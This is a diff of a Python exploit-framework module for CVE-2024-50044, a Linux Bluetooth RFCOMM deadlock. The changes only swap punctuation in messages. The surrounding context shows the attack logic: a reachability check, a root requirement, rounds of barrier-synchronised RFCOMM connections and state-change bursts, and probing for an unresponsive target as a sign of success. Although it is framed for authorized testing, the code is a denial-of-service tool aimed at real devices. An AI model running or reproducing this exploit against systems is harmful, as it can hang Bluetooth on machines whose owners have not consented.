@@ -66,7 +66,7 @@ class Module(ExploitModule):
        - Thread B: socket_lock → session_lock (state_change callback)
     5. RFCOMM worker thread hangs indefinitely
 
-    Impact: System hang — all Bluetooth RFCOMM activity frozen
+    Impact: System hang, all Bluetooth RFCOMM activity frozen
     Detection: dmesg shows "INFO: task rfcomm:N blocked for more than Xs"
     """
 
@@ -119,7 +119,7 @@ class Module(ExploitModule):
 
     def check(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         target = self.get_option("target")
         if not self.validate_bd_addr(target):
@@ -130,7 +130,7 @@ class Module(ExploitModule):
             s.settimeout(5.0)
             s.connect((target, RFCOMM_PSM))
             s.close()
-            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to CVE-2024-50044")
+            print_success(f"RFCOMM PSM reachable, {target} may be vulnerable to CVE-2024-50044")
             return True
         except bluetooth.BluetoothError as e:
             print_error(f"Unreachable: {e}")
@@ -138,7 +138,7 @@ class Module(ExploitModule):
 
     def run(self) -> bool:
         if not BLUETOOTH_AVAILABLE:
-            print_error("pybluez2 required — pip install pybluez2")
+            print_error("pybluez2 required, pip install pybluez2")
             return False
         if os.geteuid() != 0:
             print_error("Root privileges required")
@@ -160,7 +160,7 @@ class Module(ExploitModule):
         print_info(f"Rounds      : {rounds}")
         print_info("─" * 50)
         print_warning("DISCLAIMER: For authorized security testing only!")
-        print_info("Triggering CVE-2024-50044 — rfcomm_sk_state_change() deadlock...")
+        print_info("Triggering CVE-2024-50044, rfcomm_sk_state_change() deadlock...")
 
         deadlock_signals = 0
         barrier = threading.Barrier(n_conns)  # synchronized simultaneous send
@@ -181,7 +181,7 @@ class Module(ExploitModule):
                     errors.append(str(e))
 
             if not sockets:
-                print_warning(f"  Round {rnd + 1}: all connects failed — {errors[0] if errors else '?'}")
+                print_warning(f"  Round {rnd + 1}: all connects failed, {errors[0] if errors else '?'}")
                 deadlock_signals += 1
                 time.sleep(0.5)
                 continue
@@ -228,7 +228,7 @@ class Module(ExploitModule):
 
             if error_count > 0:
                 deadlock_signals += 1
-                print_warning(f"  Connection errors after state-change burst — possible deadlock")
+                print_warning(f"  Connection errors after state-change burst, possible deadlock")
 
             # Close all sockets
             for s in sockets:
@@ -241,7 +241,7 @@ class Module(ExploitModule):
             time.sleep(0.5)
             still_alive = self._probe(target)
             if not still_alive:
-                print_success(f"  Round {rnd + 1}: target not responding — deadlock likely triggered!")
+                print_success(f"  Round {rnd + 1}: target not responding, deadlock likely triggered!")
                 deadlock_signals += 1
 
         print_info("─" * 50)
@@ -250,7 +250,7 @@ class Module(ExploitModule):
             print_success(f"Deadlock indicators: {deadlock_signals}")
             print_info("Check target dmesg for 'blocked for more than' or 'possible deadlock'")
         else:
-            print_info("No definitive deadlock detected — target may be patched")
+            print_info("No definitive deadlock detected, target may be patched")
 
         self.add_result({
             "target": target,
